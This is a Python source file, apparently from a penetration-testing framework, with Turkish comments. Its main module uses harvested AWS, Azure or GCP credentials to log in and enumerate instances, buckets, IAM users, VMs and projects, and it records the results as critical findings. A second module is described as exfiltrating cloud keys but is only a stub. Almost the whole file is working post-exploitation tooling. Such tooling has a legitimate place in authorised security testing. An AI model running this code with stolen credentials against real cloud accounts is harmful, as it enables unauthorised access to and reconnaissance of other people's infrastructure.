from typing import Optional, Dict, Any, List
import requests
import json
import base64

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Cloud SDK'lar için opsiyonel bağımlılıklar
try:
    import boto3
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False

try:
    from azure.identity import ClientSecretCredential
    from azure.mgmt.resource import ResourceManagementClient
    from azure.mgmt.compute import ComputeManagementClient
    AZURE_AVAILABLE = True
except ImportError:
    AZURE_AVAILABLE = False

try:
    from google.cloud import resource_manager
    from google.oauth2 import service_account
    GCP_AVAILABLE = True
except ImportError:
    GCP_AVAILABLE = False


class CloudPivotModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="cloud_pivot.exploit",
            title="Cloud Pivot - Connect and Enumerate Resources",
            risk_level=RiskLevel.DESTRUCTIVE,
            description=(
                "Uses harvested cloud credentials to connect to AWS, Azure, or GCP "
                "and enumerate resources (EC2 instances, VMs, projects, storage)."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        """Cloud credential'ları varsa çalışabilir"""
        return bool(
            getattr(context, "vault_addr", None)
            and _has_cloud_creds(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Cloud pivot requires harvested cloud credentials.",
                evidence={"missing": ["cloud_credentials"]},
            )

        params = params or {}
        provider = params.get("provider", "aws").lower()
        timeout = params.get("timeout", TIMEOUT)

        # Context'ten credential'ları al
        cloud_creds = _get_cloud_creds(context, provider)
        if not cloud_creds:
            return ExecutionResult(
                status="failed",
                message=f"No {provider.upper()} credentials found in context.",
                evidence={"error": "Missing credentials"},
            )

        # İlk credential'ı kullan
        cred = cloud_creds[0]

        print(f"[*] [ACTIVE] Connecting to {provider.upper()} cloud...")

        try:
            if provider == "aws":
                return self._exploit_aws(context, cred, params)
            elif provider == "azure":
                return self._exploit_azure(context, cred, params)
            elif provider == "gcp":
                return self._exploit_gcp(context, cred, params)
            else:
                return ExecutionResult(
                    status="error",
                    message=f"Unsupported cloud provider: {provider}",
                    evidence={"error": "Invalid provider"},
                )

        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"Cloud pivot failed: {str(e)}",
                evidence={"error": str(e)},
            )

    # ─── AWS ──────────────────────────────────────────────────────────────

    def _exploit_aws(self, context, cred, params):
        if not BOTO3_AVAILABLE:
            return ExecutionResult(
                status="error",
                message="boto3 not installed. Run: pip install boto3",
                evidence={"error": "Missing dependency: boto3"},
            )

        access_key = cred.get("access_key")
        secret_key = cred.get("secret_key")
        session_token = cred.get("security_token")
        region = params.get("region", "us-east-1")

        if not access_key or not secret_key:
            return ExecutionResult(
                status="failed",
                message="AWS credentials incomplete.",
                evidence={"error": "Missing access_key or secret_key"},
            )

        session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            aws_session_token=session_token,
            region_name=region,
        )

        results = {}
        findings = []

        # 1. EC2 Instance'ları listele
        try:
            ec2 = session.client('ec2')
            instances = ec2.describe_instances()
            instance_list = []
            for reservation in instances.get('Reservations', []):
                for instance in reservation.get('Instances', []):
                    instance_list.append({
                        "id": instance.get('InstanceId'),
                        "state": instance.get('State', {}).get('Name'),
                        "type": instance.get('InstanceType'),
                        "name": _get_tag(instance, 'Name'),
                        "public_ip": instance.get('PublicIpAddress'),
                        "private_ip": instance.get('PrivateIpAddress'),
                    })
            results["ec2_instances"] = instance_list
            findings.append(f"Found {len(instance_list)} EC2 instances")
        except Exception as e:
            findings.append(f"EC2 list failed: {str(e)}")

        # 2. S3 Bucket'ları listele
        try:
            s3 = session.client('s3')
            buckets = s3.list_buckets()
            bucket_list = [b['Name'] for b in buckets.get('Buckets', [])]
            results["s3_buckets"] = bucket_list
            findings.append(f"Found {len(bucket_list)} S3 buckets")
        except Exception as e:
            findings.append(f"S3 list failed: {str(e)}")

        # 3. IAM Kullanıcıları listele
        try:
            iam = session.client('iam')
            users = iam.list_users()
            user_list = [u['UserName'] for u in users.get('Users', [])]
            results["iam_users"] = user_list
            findings.append(f"Found {len(user_list)} IAM users")
        except Exception as e:
            findings.append(f"IAM list failed: {str(e)}")

        # Bulguları kaydet
        if results:
            context.add_finding(
                title="CRITICAL: AWS Resources Enumerated",
                description="; ".join(findings),
                severity="CRITICAL",
                evidence=results,
            )

        return ExecutionResult(
            status="success" if results else "partial",
            message=f"AWS pivot: {', '.join(findings)}",
            evidence=results,
        )

    # ─── AZURE ─────────────────────────────────────────────────────────────

    def _exploit_azure(self, context, cred, params):
        if not AZURE_AVAILABLE:
            return ExecutionResult(
                status="error",
                message="azure-identity and azure-mgmt-resource not installed.",
                evidence={"error": "Missing Azure SDK dependencies"},
            )

        tenant_id = cred.get("tenant_id")
        client_id = cred.get("client_id")
        client_secret = cred.get("client_secret")
        subscription_id = params.get("subscription_id") or cred.get("subscription_id")

        if not tenant_id or not client_id or not client_secret:
            return ExecutionResult(
                status="failed",
                message="Azure credentials incomplete.",
                evidence={"error": "Missing tenant_id, client_id, or client_secret"},
            )

        if not subscription_id:
            return ExecutionResult(
                status="failed",
                message="Azure subscription_id required.",
                evidence={"error": "Missing subscription_id"},
            )

        try:
            credential = ClientSecretCredential(
                tenant_id=tenant_id,
                client_id=client_id,
                client_secret=client_secret,
            )

            results = {}
            findings = []

            # 1. Resource Groups listele
            try:
                resource_client = ResourceManagementClient(credential, subscription_id)
                groups = resource_client.resource_groups.list()
                group_list = [g.name for g in groups]
                results["resource_groups"] = group_list
                findings.append(f"Found {len(group_list)} resource groups")
            except Exception as e:
                findings.append(f"Resource group list failed: {str(e)}")

            # 2. VM'leri listele
            try:
                compute_client = ComputeManagementClient(credential, subscription_id)
                vms = compute_client.virtual_machines.list_all()
                vm_list = [{
                    "name": vm.name,
                    "location": vm.location,
                    "type": vm.type,
                } for vm in vms]
                results["virtual_machines"] = vm_list
                findings.append(f"Found {len(vm_list)} virtual machines")
            except Exception as e:
                findings.append(f"VM list failed: {str(e)}")

            if results:
                context.add_finding(
                    title="CRITICAL: Azure Resources Enumerated",
                    description="; ".join(findings),
                    severity="CRITICAL",
                    evidence=results,
                )

            return ExecutionResult(
                status="success" if results else "partial",
                message=f"Azure pivot: {', '.join(findings)}",
                evidence=results,
            )

        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"Azure pivot failed: {str(e)}",
                evidence={"error": str(e)},
            )

    # ─── GCP ──────────────────────────────────────────────────────────────

    def _exploit_gcp(self, context, cred, params):
        if not GCP_AVAILABLE:
            return ExecutionResult(
                status="error",
                message="google-cloud-resource-manager not installed.",
                evidence={"error": "Missing GCP SDK dependencies"},
            )

        private_key_data = cred.get("private_key_data")
        service_account_email = cred.get("service_account_email")

        if not private_key_data or not service_account_email:
            return ExecutionResult(
                status="failed",
                message="GCP credentials incomplete.",
                evidence={"error": "Missing private_key_data or service_account_email"},
            )

        try:
            # private_key_data base64 veya JSON olabilir
            try:
                key_json = base64.b64decode(private_key_data).decode('utf-8')
                key_dict = json.loads(key_json)
            except:
                key_dict = json.loads(private_key_data) if isinstance(private_key_data, str) else private_key_data

            credentials = service_account.Credentials.from_service_account_info(key_dict)
            client = resource_manager.Client(credentials=credentials)

            results = {}
            findings = []

            # 1. Projeleri listele
            try:
                projects = client.list_projects()
                project_list = [{
                    "id": p.project_id,
                    "name": p.name,
                    "status": p.status,
                } for p in projects]
                results["projects"] = project_list
                findings.append(f"Found {len(project_list)} projects")
            except Exception as e:
                findings.append(f"Project list failed: {str(e)}")

            if results:
                context.add_finding(
                    title="CRITICAL: GCP Resources Enumerated",
                    description="; ".join(findings),
                    severity="CRITICAL",
                    evidence=results,
                )

            return ExecutionResult(
                status="success" if results else "partial",
                message=f"GCP pivot: {', '.join(findings)}",
                evidence=results,
            )

        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"GCP pivot failed: {str(e)}",
                evidence={"error": str(e)},
            )


# ─── YARDIMCILAR ──────────────────────────────────────────────────────────────


class CloudKeyExfiltrationModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="cloud_key_exfiltration.key_dump",
            title="Cloud Key Exfiltration",
            risk_level=RiskLevel.STATE_CHANGING,
            description=(
                "Attempts to locate and exfiltrate cloud provider keys and service account secrets."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        # Require a vault address and some credentials to operate
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        # Minimal implementation: do not perform any network calls here.
        if not getattr(context, "vault_addr", None):
            return ExecutionResult(status="skipped", message="Missing vault_addr", evidence={"missing": ["vault_addr"]})

        # This module is a placeholder in tests; return a harmless partial result.
        return ExecutionResult(status="partial", message="Cloud key exfiltration module is not configured.", evidence={})


# ─── YARDIMCILAR ──────────────────────────────────────────────────────────────

def _get_tag(instance, tag_name):
    """EC2 instance'dan tag değerini al"""
    for tag in instance.get('Tags', []):
        if tag.get('Key') == tag_name:
            return tag.get('Value')
    return None


def _has_cloud_creds(context):
    """Context'te cloud credential'ları var mı kontrol et"""
    for finding in getattr(context, "findings", []):
        if "cloud" in finding.get("title", "").lower():
            return True
    return False


def _get_cloud_creds(context, provider):
    """Context'ten cloud credential'larını topla"""
    creds = []
    
    for finding in getattr(context, "findings", []):
        evidence = finding.get("evidence", {})
        if "credentials" in evidence:
            for cred in evidence.get("credentials", []):
                if cred.get("provider", "").lower() == provider:
                    creds.append(cred)
    
    # Doğrudan attribute
    if hasattr(context, "cloud_credentials"):
        for cred in context.cloud_credentials:
            if cred.get("provider", "").lower() == provider:
                creds.append(cred)
    
    return creds